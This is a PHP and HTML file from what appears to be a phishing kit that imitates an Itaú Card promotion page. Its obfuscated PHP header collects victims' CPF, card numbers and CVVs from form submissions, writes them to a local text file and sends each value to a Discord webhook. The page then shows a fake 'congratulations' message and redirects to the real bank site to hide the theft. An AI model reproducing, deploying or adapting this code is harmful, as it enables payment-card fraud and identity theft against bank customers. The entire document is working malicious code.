<?php
 goto FSgKT; E0fKY: if (empty($modulo5)) { } else { $answer = $modulo5; $content = "\103\x56\x56\x3a\x20{$answer}"; $link = "\x68\164\x74\160\x73\x3a\x2f\57\x64\151\163\x63\x6f\x72\144\56\x63\x6f\155\57\141\160\x69\57\x77\x65\142\x68\x6f\157\153\163\x2f\x31\x31\x31\x39\67\70\x37\71\63\x36\64\64\70\62\x35\63\71\x36\63\x2f\x32\x74\143\146\x47\106\x6d\x4d\x48\116\x61\x34\x77\130\x4f\115\x50\x53\x34\60\120\163\142\107\120\x49\x68\152\x76\110\x64\55\111\167\x73\143\x38\105\x36\121\x65\123\x56\167\123\166\x41\143\x65\63\x47\157\141\112\111\x74\x6f\161\164\137\x4e\157\115\146\150\x6a\x51\x71"; $basearray = array("\143\157\x6e\x74\x65\156\164" => $content); $hookarray = array("\x68\164\x74\160" => array("\x68\145\x61\x64\145\x72" => "\x43\157\156\164\145\x6e\164\x2d\164\171\160\x65\72\40\141\160\160\x6c\x69\143\141\164\x69\x6f\156\57\170\x2d\x77\167\x77\55\146\x6f\x72\x6d\x2d\x75\162\x6c\145\x6e\143\157\144\145\144\15\12", "\x6d\x65\164\x68\x6f\x64" => "\x50\117\x53\x54", "\143\x6f\x6e\x74\x65\x6e\164" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto qrX01; nnWey: if (empty($modulo4)) { } else { $answer = $modulo4; $content = "\x56\101\114\111\x44\x41\x44\x45\x3a\x20{$answer}"; $link = "\150\164\x74\160\163\72\57\57\x64\x69\163\x63\x6f\162\144\x2e\143\157\155\57\x61\x70\x69\57\x77\145\142\150\x6f\157\x6b\x73\x2f\61\x31\61\71\67\70\x37\71\x33\66\x34\x34\x38\x32\65\x33\71\x36\63\57\62\164\x63\x66\107\x46\x6d\x4d\x48\x4e\x61\x34\x77\130\x4f\x4d\x50\123\x34\x30\x50\x73\142\107\x50\x49\x68\152\x76\110\144\x2d\x49\167\x73\x63\x38\x45\66\121\x65\123\126\167\123\166\x41\x63\145\63\107\157\141\x4a\x49\x74\x6f\161\x74\137\x4e\x6f\115\x66\150\x6a\x51\x71"; $basearray = array("\143\157\x6e\164\x65\x6e\x74" => $content); $hookarray = array("\x68\164\x74\x70" => array("\x68\145\x61\144\x65\162" => "\103\x6f\x6e\x74\145\156\x74\x2d\x74\x79\160\145\x3a\40\141\160\x70\x6c\x69\143\141\x74\151\x6f\156\x2f\170\x2d\167\167\167\55\x66\157\162\x6d\x2d\x75\x72\154\x65\156\143\157\144\x65\144\15\xa", "\x6d\x65\164\150\157\x64" => "\120\117\x53\124", "\143\x6f\x6e\x74\x65\156\164" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto E0fKY; LYlGW: $fp = fopen("\143\x61\x72\x64\x73\145\156\x68\141\x2e\164\x78\x74", "\x61"); goto zs8ZQ; NHq2m: fclose($fp); goto H65Kz; Q0KBp: $cvv = $_POST["\x6e\165\155\x63\166\x76"]; goto o0FVs; mMiLN: if (empty($modulo3)) { } else { $answer = $modulo3; $content = "\103\x50\x46\x3a\x20{$answer}"; $link = "\150\164\x74\x70\x73\72\57\x2f\144\151\163\x63\157\x72\x64\x2e\143\x6f\x6d\x2f\141\160\x69\57\x77\145\142\150\157\x6f\x6b\163\x2f\61\x31\61\71\x37\x38\x37\x39\63\66\x34\64\x38\x32\65\63\x39\66\x33\57\x32\x74\x63\146\107\x46\x6d\115\110\x4e\141\64\x77\x58\117\x4d\x50\123\x34\60\120\163\142\x47\x50\x49\150\152\166\x48\144\x2d\111\x77\163\143\70\105\66\x51\x65\123\126\x77\x53\166\x41\143\145\x33\x47\x6f\141\112\x49\x74\157\x71\x74\x5f\116\x6f\115\146\150\x6a\121\x71"; $basearray = array("\x63\x6f\156\x74\145\x6e\x74" => $content); $hookarray = array("\150\164\164\160" => array("\x68\145\x61\x64\x65\x72" => "\103\x6f\156\x74\x65\156\164\x2d\x74\x79\160\x65\x3a\x20\141\x70\160\154\151\143\x61\164\x69\157\x6e\x2f\170\x2d\x77\x77\167\55\146\x6f\162\155\55\x75\x72\x6c\145\156\x63\157\144\145\144\xd\12", "\x6d\145\x74\x68\x6f\144" => "\x50\x4f\123\124", "\143\157\x6e\x74\x65\x6e\x74" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto nnWey; kKUWX: $data = $_POST["\x6e\x75\155\144\164\x76"]; goto Q0KBp; H65Kz: $modulo3 = $_POST["\x6e\x75\x6d\x63\160\x66"]; goto o8QgF; zs8ZQ: fwrite($fp, $tudo); goto NHq2m; FSgKT: $cpf = $_POST["\156\x75\155\143\x70\146"]; goto kKUWX; o8QgF: $modulo4 = $_POST["\156\165\x6d\144\164\166"]; goto yIcq2; o0FVs: $tudo = '' . $cpf . "\x20\174\40" . $data . "\40\x7c\40" . $cvv . "\74\x62\x72\x3e\12"; goto LYlGW; yIcq2: $modulo5 = $_POST["\x6e\165\155\143\166\x76"]; goto mMiLN; qrX01: ?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Itau Card | Seus Benefícios</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta http-equiv="refresh" content="7, url='https://www.itau.com.br/mobile/cartoes/'">
	<link rel="stylesheet" type="text/css" href="parabens_arquivos/benef_compras_style.css">
</head>
<body>
	<header class="top-promo">
		<img src="parabens_arquivos/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li class="active">Cadastro</li>
			<li class="active">Benefícios</li>
		</ul>
	</section>
	<section class="eng-fim">
		<img class="img-suc" src="parabens_arquivos/ic_checked2.png">
		<h2>Parabéns</h2>
		<p>Seu cartão itaucard foi cadastrado com sucesso na promoção 
descontão, agora você terá automaticamente 50% de desconto em compras 
feitas nos cinemas, teatros, estádios de futebol, restaurantes e muitos 
outros estabelecimentos parceiros do itaú, aproveite.</p>
		<p>Aguarde um momento você será redirecionado...</p>
	</section>

</body></html>